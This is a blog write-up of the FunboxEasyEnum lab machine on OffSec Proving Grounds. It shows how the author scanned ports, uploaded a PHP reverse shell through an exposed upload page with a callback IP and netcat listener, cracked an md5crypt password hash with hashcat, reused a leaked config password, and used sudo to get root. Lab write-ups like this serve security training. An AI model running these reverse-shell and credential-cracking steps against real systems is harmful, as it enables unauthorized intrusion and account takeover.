---
title: FunboxEasyEnum Writeup
author: mooncakeza
date: 2021-06-01 08:30am
categories: [writeup, offsec, proving grounds]
tags: [writeup, offsec, proving grounds]
math: true
mermaind: true
image: /assets/img/pg/provinggrounds.png
---

This is my first Offensive Security writeup of a machine on their Proving Grounds platform. 
<br>
I signed up for the free labs and managed to do 2 easy machines and get this writeup done before the daily 3 hour timer expired.

## Enumeration

Starting with Rustscan with NMAP. I have cleaned up the output to just show the relevant info.

```bash
└─$ rustscan -a 192.168.245.132 -u 5000 -- -A -sC -sV                                 
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Please contribute more quotes to our GitHub https://github.com/rustscan/rustscan

[~] The config file is expected to be at "/home/mooncake/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 192.168.245.132:22
Open 192.168.245.132:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-31 07:41 SAST
Scanned at 2021-05-31 07:41:48 SAST for 15s

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 9c:52:32:5b:8b:f6:38:c7:7f:a1:b7:04:85:49:54:f3 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC3a6aFbaxLEn4AMDXmMVZdNfaQuJQ/AcPHffagHb77o1FmSe+6tlCRHMil9l4qJILffRQHkdbQJtrlBk52V35SHfPp8x89B+Pfv7slkKxXE7fkZBIJuUjHF+YAoSakOtY72d7o6Bet2AwCijSBzZ1bkVC4i/L9euG2Oul5oA2iFlnzwYjrhki6MFNFJvvyoOqcJr1zS+w4W0NO1RexielQsxeUG3khrfVYts5kWFQPr39tk52zRZ/gpAKjR00XN4N5mi/mBjvvgnlVX4DNeyxh5r+E5sdLGzJ0Vk8JzjDW7eK70kv2KmVCFSJNceUjfaIV+K4z9wFoy6qZte7MxhaV
|   256 d6:13:56:06:15:36:24:ad:65:5e:7a:a1:8c:e5:64:f4 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBAoJi5En616tTVEM4UoE0AVaXFn6+Rhike29q/pKZh5nIPQfNr9jqz2II9iZ5NZCPwsjp3QrsmTdzGwqUbjMe0c=
|   256 1b:a9:f3:5a:d0:51:83:18:3a:23:dd:c4:a9:be:59:f0 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIO+CVl8CiYP8L+ni0CvmpS7ywOiJU62E3O6L8G2n/Yov
80/tcp open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|_  Supported Methods: POST OPTIONS HEAD GET
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.17 seconds
```

With only ports 22 and 80 open we fire up Feroxbuster and find the following:

![Desktop View](/assets/img/pg/funboxeasyenum/Feroxbuster mini php.png){: .shadow}

We found http://192.168.145.132/mini.php
<br>
Browsing to it and I see you can upload files.

![Desktop View](/assets/img/pg/funboxeasyenum/Mini Shell PHP.png){: .shadow}

## Foothold

We grab the php-reverse-shell.php on our Kali machine and rename it to shell.php

```bash
-$ cp /usr/share/webshells/php/php-reverse-shell.php shell.php
```

We change the following in the file to match our VPN ip as well as the port we are going to use to listen on for a reverse shell.

```bash
$ip = '192.168.49.245';  // CHANGE THIS
$port = 9998;       // CHANGE THIS
```

In another terminal we start a netcat listener.

```bash
$ nc -lvnp 9998
listening on [any] 9998 ...
```
We then browse back to http://192.168.245.132/mini.php and upload the shell.php

![Desktop View](/assets/img/pg/funboxeasyenum/Shell upload.png){: .shadow}

Once uploaded, it showed up in the list.

![Desktop View](/assets/img/pg/funboxeasyenum/Shell filed uploaded.png){: .shadow}

We now have to change the permissions to execute otherwise the webserver will not be able to execute the php file to run our reverse shell. We changed the permissions to 0777. Drastic I know.

![Desktop View](/assets/img/pg/funboxeasyenum/Shell file permissions.png){: .shadow}

![Desktop View](/assets/img/pg/funboxeasyenum/Shell file permissions change.png){: .shadow}

Once done, browse to http://192.168.245.132/shell.php
<br>
We then received the shell in our netcat listener window.

![Desktop View](/assets/img/pg/funboxeasyenum/Reverse Shell.png){: .shadow}

## local flag

We first have to get an interactive shell, so we use the python method.

```bash
$ python3 -c  'import pty; pty.spawn("/bin/bash")'
www-data@funbox7:/$ 
```

We browse to the www-data home directory and see the following.


![View-Desktop](/assets/img/pg/funboxeasyenum/First flag.png){: .shadow}

The proof.txt file! Easy win without having to enumerate anywhere else on the machine.

Unfortunately we are only www-data and still need to get to root.

## User Escalation

Let us see what users are on the machine.

![Desktop-View](/assets/img/pg/funboxeasyenum/Passwd file.png)

We find a hash for the oracle user.
<br>
Let's identify the type of hash.

![Desktop-View](/assets/img/pg/funboxeasyenum/Identify Hash.png)

<br>
Let us check [hashcat examples](https://www.google.com/search?client=firefox-b-d&q=hashcat+examples) to verify.
<br>
As we can see it's a md5Crypt hash.

![Desktop-View](/assets/img/pg/funboxeasyenum/hashcat examples.png)

Let's crack it.

```bash
hashcat -m 500 oracle.hash /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt
```

![Desktop-View](/assets/img/pg/funboxeasyenum/hashcat cracked.png)

Hash cracked.
<br>
We try to ssh as the oracle user but this didn't work but doing a su to the user worked.
<br>
We upload LinPEAS.sh to find anything useful.

![Desktop-View](/assets/img/pg/funboxeasyenum/linpeas upload.png)

LinPEAS didn't give much but we did find the following users and only the user karla was interesting as this user seems to have much more access on the system than the others.

![Desktop-View](/assets/img/pg/funboxeasyenum/Users on box.png)

Further enumeration was needed. I remembered seeing phpMyAdmin from Feroxbuster. I searched for phpMyAdmin config file and found the following.

![Desktop-View](/assets/img/pg/funboxeasyenum/phpmyadmin config.png)

Could this password be reused for karla? One way to try.

![Desktop-View](/assets/img/pg/funboxeasyenum/Karla SSH.png)

Success.

## Priviledge Escalation

As we saw the user karla was part of the sudoers group, we immediately check what sudo commands can be run.

![Desktop-View](/assets/img/pg/funboxeasyenum/Karla sudo.png)

Seems like karla is allowed to run all commands on the system while using sudo.
<br>
We can simply just get a bash shell by running the following.

![Desktop-View](/assets/img/pg/funboxeasyenum/Karla Privsec.png)

## proof flag

Let's go check the root directory for the loot.

![Desktop-View](/assets/img/pg/funboxeasyenum/Second Flag.png)

